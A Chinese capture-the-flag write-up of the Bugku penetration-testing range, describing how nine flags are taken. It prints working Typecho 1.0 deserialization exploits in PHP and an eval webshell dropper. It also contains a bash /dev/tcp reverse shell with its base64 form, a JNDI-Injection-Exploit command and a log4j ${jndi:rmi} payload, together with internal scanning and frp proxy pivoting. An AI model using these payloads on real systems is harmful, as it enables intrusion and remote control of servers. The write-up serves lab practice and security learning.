### 获取第一个flag（Typcho反序列化）

访问靶场 http://106.14.239.111/发现是Typecho1.0![bugku 渗透测试2](assets/9-1694490092.png)

百度查找历史漏洞 https://cloud.tencent.com/developer/article/1922080![bugku 渗透测试2](assets/1-1694490092.png)使用poc进行攻击

```
<?php
class Typecho_Feed{
    const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items;
 
    public function __construct(){
        //__toString函数检查
        $this->_type = self::RSS2;
        //触发__get函数
        $_item['author'] = new Typecho_Request();
        //触发错误
        $_item['category'] = array(new Typecho_Request());
        $this->_items[0] = $_item;
    }
}
 
class Typecho_Request{
    private $_params = array();
    private $_filter = array();
 
    public function __construct(){
        //回调函数的参数，即想要执行的命令
        $this->_params['screenName'] = 'ls';
        //回调函数
        $this->_filter[0] = "system";
    }
}

$data = new Typecho_Feed();
$poc = array(
    'adapter' => $data,
    'prefix' => "typecho_"
);
 
//序列化
$s = serialize($poc);
//base64编码
echo base64_encode($s);
?>
```

post传参

```
POST /install.php?finish HTTP/1.1
Host: 106.14.239.111
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Referer: 106.14.239.111:80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 685

__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo3OiJjYXQgL2YqIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX1zOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjc6ImNhdCAvZioiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==
```

![bugku 渗透测试2](assets/2-1694490093.png)![bugku 渗透测试2](assets/0-1694490093.png)

![bugku 渗透测试2](assets/2-1694490093-1.png)![bugku 渗透测试2](assets/0-1694490093-1.png)

### 获取第二个flag（翻数据库）

写入马子使用蚁剑连接

```
<?php
class Typecho_Feed
{
const RSS1 = 'RSS 1.0';
const RSS2 = 'RSS 2.0';
const ATOM1 = 'ATOM 1.0';
const DATE_RFC822 = 'r';
const DATE_W3CDTF = 'c';
const EOL = "n";
private $_type;
private $_items;

public function __construct(){
$this->_type = $this::RSS2;
$this->_items[0] = array(
'title' => '1',
'link' => '1',
'date' => 1508895132,
'category' => array(new Typecho_Request()),
'author' => new Typecho_Request(),
);
}
}
class Typecho_Request
{
private $_params = array();
private $_filter = array();
public function __construct(){
$this->_params['screenName'] = 'file_put_contents("getshell.php","<?php @eval($_REQUEST[8888]);?>")'; //替换phpinfo()这里进行深度利用
$this->_filter[0] = 'assert';
}
}

$exp = array(
'adapter' => new Typecho_Feed(),
'prefix' => 'typecho_'
);

echo base64_encode(serialize($exp));
?>
```

连上蚁剑，查看配置文件![bugku 渗透测试2](assets/3-1694490093.png)得到数据库账号密码![bugku 渗透测试2](assets/10-1694490094.png)

```
$db->addServer(array (
  'host' => 'localhost',
  'user' => 'cms',
  'password' => '7aed78676bf27528',
  'charset' => 'utf8',
  'port' => '3306',
  'database' => 'cms',
), Typecho_Db::READ | Typecho_Db::WRITE);
```

连接数据库，得到flag2![bugku 渗透测试2](assets/10-1694490094-1.png)

### flag3获取（代码审计+打log4j）

尝试提权无果 

内网横向 信息收集 

探测存活网段 发现只存在192.168.0.0/24 fscan进行扫描

![bugku 渗透测试2](assets/9-1694490094.png)

```
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 192.168.0.1     is alive
(icmp) Target 192.168.0.2     is alive
(icmp) Target 192.168.0.3     is alive
[*] Icmp alive hosts len is: 3
192.168.0.3:80 open
192.168.0.2:80 open
192.168.0.1:80 open
192.168.0.1:22 open
192.168.0.2:3306 open
[*] alive ports len is: 5
start vulscan
[*] WebTitle: http://192.168.0.1        code:200 len:3392   title:Harry's Blog
[*] WebTitle: http://192.168.0.2        code:200 len:3392   title:Harry's Blog
[+] mysql:192.168.0.2:3306:root 
[*] WebTitle: http://192.168.0.3        code:200 len:4789   title:Bugku后台管理系统
已完成 4/5 [-] ssh 192.168.0.1:22 root 123qwe ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 4/5 [-] ssh 192.168.0.1:22 root A123456s! ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
```

使用代理进行访问 上传代理![bugku 渗透测试2](assets/9-1694490094-1.png)![bugku 渗透测试2](assets/10-1694490094-2.png)![bugku 渗透测试2](assets/4-1694490095.png)是一个登陆框![bugku 渗透测试2](assets/2-1694490095.png)尝试弱口令和注入无果![bugku 渗透测试2](assets/7-1694490096.png)在登陆返回包中发现suorce:source.zip![bugku 渗透测试2](assets/5-1694490097.png)尝试进行下载进行分析,发现可能是log4j![bugku 渗透测试2](assets/10-1694490097.png)

```
bash -i >& /dev/tcp/127.0.0.1/5887 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNTg4NyAwPiYx
```

![bugku 渗透测试2](assets/3-1694490099.png)使用JNDI注入工具（JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar）在vps上开启好对应的服务

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNTg4NyAwPiYx}|{base64,-d}|{bash,-i}" -A "xx.xx.xx.xx"
```

![bugku 渗透测试2](assets/3-1694490100.png)

log4j

```
${jndi:rmi://127.0.0.1:1099/jium02}
```

![bugku 渗透测试2](assets/9-1694490101.png)

![bugku 渗透测试2](assets/9-1694490102.png)

![bugku 渗透测试2](assets/2-1694490103.png)

### flag4、5 获取（find命令查找flag）

find查找 flag 在root目录下发现flag4

```
find / -name "*flag*"
```

![bugku 渗透测试2](assets/0-1694490104.png)grep -rn "flag{" 查找到flag5![bugku 渗透测试2](assets/2-1694490105.png)

### flag6获取(恢复git)

使用wget下载 fscan、frp

![bugku 渗透测试2](assets/10-1694490106.png)

![bugku 渗透测试2](assets/2-1694490106.png)

![bugku 渗透测试2](assets/9-1694490107.png)

![bugku 渗透测试2](assets/8-1694490109.png)进行网段探测发现存在192.168.1.2/24![bugku 渗透测试2](assets/1-1694490110.png)fscan进行扫描![bugku 渗透测试2](assets/10-1694490111.png)发现192.168.1.3有web界面

```
start infoscan
(icmp) Target 192.168.1.2     is alive
(icmp) Target 192.168.1.1     is alive
(icmp) Target 192.168.1.3     is alive
[*] Icmp alive hosts len is: 3
192.168.1.1:80 open
192.168.1.2:80 open
192.168.1.3:80 open
192.168.1.1:22 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://192.168.1.2        code:200 len:4789   title:Bugku后台管理系统
[*] WebTitle: http://192.168.1.1        code:200 len:3392   title:Harry's Blog
[*] WebTitle: http://192.168.1.3        code:200 len:524    title:乙公司Git仓库
```

使用frp代理出来 因为是出网的 直接代理就行，不需要二层代理 服务端![bugku 渗透测试2](assets/2-1694490112.png)客户端![bugku 渗透测试2](assets/0-1694490113.png)![bugku 渗透测试2](assets/6-1694490114.png)

![bugku 渗透测试2](assets/4-1694490115.png)![bugku 渗透测试2](assets/0-1694490117.png)

![bugku 渗透测试2](assets/2-1694490117.png)![bugku 渗透测试2](assets/4-1694490118.png)

### 获取flag7

能访问下载git文件，尝试下载与php相关的文件看是否能够执行

```
https://gitee.com/xiao-liuliu/hhh.git
```

hhh.phtml、hhh.php、hhh.php3

```
<?php @eval($_POST['cmd']);
echo "666";
phpinfo();
?>
```

![bugku 渗透测试2](assets/4-1694490120.png)连接蚁剑，在根目录下发现flag![bugku 渗透测试2](assets/4-1694490121.png)

### flag8获取(ftp 命令读取flag文件)

信息收集 进行内网存活网段探测，存在10.10.0.2/24![bugku 渗透测试2](assets/2-1694490122.png)

![bugku 渗透测试2](assets/4-1694490123.png)image.png

使用代理工具代理出来

使用ftp工具连接，连接成功，但是一直卡在读取目录列表![bugku 渗透测试2](assets/9-1694490124.png)

使用kali设置socks5代理，/etc/proxychains4.conf里加上socks5代理，成功连接![bugku 渗透测试2](assets/8-1694490125.png)get flag远程下载flag文件拿到flag![bugku 渗透测试2](assets/4-1694490126.png)

### flag9获取

提示一个/，可能在根目录 在根目录下获取到flag![bugku 渗透测试2](assets/8-1694490127.png)![bugku 渗透测试2](assets/7-1694490128.png)



**★**